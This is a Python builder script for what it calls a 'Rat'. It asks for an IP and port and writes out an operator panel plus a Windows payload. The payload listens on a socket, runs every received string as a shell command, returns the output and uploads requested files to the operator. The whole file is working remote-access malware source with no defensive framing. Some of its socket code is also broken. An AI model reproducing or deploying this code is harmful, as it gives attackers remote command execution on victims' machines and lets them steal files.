# -*- coding: utf-8 -*-
import os , time
from colorama import Fore as c

def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.000001) 

def rat_windows_1():
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear') 
    pr(c.YELLOW+'''
       
    ┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
    ├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
    └─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─\n''')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    pr(f"{c.WHITE}({c.RED}Set Ip And Port For Panel Rat{c.WHITE})")
    ip = input(f'\n{c.WHITE}root&@elf:~# {c.GREEN}Enter The Ip: ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    port = input(f'\n{c.WHITE}root&@elf:~# {c.GREEN}Enter The Port: ')
    try:
        os.chdir('output')
    except:
        pass
    file_panel = open('panel_windows.py','w+')
    panel = f'''
import socket
import os ,tqdm
ClientSocket = socket.socket()
host = '{ip}'
port = {port}
'''+'''
SIZE = 2048
SEPARATOR = "_elf_"
print('Waiting for connection')
try:
    ClientSocket.connect((host, port))
except socket.error as e:
    print(str(e))

Response = ClientSocket.recv(SIZE)
def dayaft():
        c2 = input("Enter The Name File  : ") 
        ClientSocket.send(c2.encode())
        s2 = socket.socket()
        print(f"[*] Listening as {host}:{port}")
        client_socket, address = s2.accept() 
        
        print(f"[+] {address} is connected.")
        received = client_socket.recv(SIZE).decode()
        filename, filesize = received.split(SEPARATOR)
        
        filename = os.path.basename(filename)
        
        filesize = int(filesize)
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
           while True:
                
                bytes_read = client_socket.recv(SIZE)
                if not bytes_read:    
                    
                    break
                
                f.write(bytes_read)
                
                progress.update(len(bytes_read))

            
        client_socket.close()
    
       
while True:
    Input = input('Say Something: ')
    if Input == 'sudo':
        ClientSocket.send(Input.encode())
        dayaft()
        
    else:
        ClientSocket.send(Input.encode())
        print("send")
        Res = ClientSocket.recv(SIZE).decode()
        print(Res)
ClientSocket.close()

    '''
    
    file_panel.write(panel)
def shell():
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    pr(f"{c.WHITE}({c.RED}Set Ip And Port For Rat{c.WHITE})")
    ip = input(f'\n{c.WHITE}root&@elf:~# {c.GREEN}Enter The Ip:  ')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    port = input(f'\n{c.WHITE}root&@elf:~# {c.GREEN}Enter The Port: ')
    pr('+'+'-'*50+"+\n")
    file_shell = open('shell_windows.py','w+')
    shell_1 = f'''
import socket
import os
from _thread import *
import subprocess ,tqdm
ServerSocket = socket.socket()
host = '{ip}'
port = {port}
SIZE = 2048
'''+'''
ThreadCount = 0
SEPARATOR = "_elf_"
try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

ServerSocket.listen(5)
def ersal(c2):
    
    filename = c2
    
    filesize = os.path.getsize(filename)
    try:
        s = socket.socket()
        
        
        s.connect((host, port))
        
       
    except:
        print("error")
        s.close()
    progress = tqdm.tqdm(range(filesize), unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            
            bytes_read = f.read(SIZE)
            if not bytes_read:
                
                break
            
            s.sendall(bytes_read)
            
            progress.update(len(bytes_read))
            
    s.close()

def threaded_client(connection):
   
    connection.sendall(str.encode('Welcome to the Server ..!'))
    
    while True:
       
        data = connection.recv(SIZE)
        d = data.decode()
        sc = d.split()
    

        if d == 'sudo':
            c2 = connection.recv(SIZE).decode()

            ersal(c2)
            break

        else:
            o = subprocess.getoutput(d)
            cwd = os.getcwd()
            sms = f"{o}{d}{cwd}"
            reply = '[2]Reply : '+sms
            connection.sendall(str.encode(reply))
            if not data:
                break
            
        if sc[0].lower() == "cd":
            try:
                os.chdir(' '.join(sc[1:]))
                cwd2 = os.getcwd()
                sms2 = f"{cwd2}"
                connection.sendall(str.encode(sms2))
            except FileNotFoundError as e:
                print("ridi")
                o = str(e)
            
        
    connection.close()

while True:
    Client, address = ServerSocket.accept()
    start_new_thread(threaded_client, (Client, ))
    ThreadCount += 1
    
    
ServerSocket.close()
    
    '''
    file_shell.write(shell_1)
    pr(f"{c.WHITE}root&@elf:~# {c.GREEN}The file was created")
    time.sleep(5)
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear') 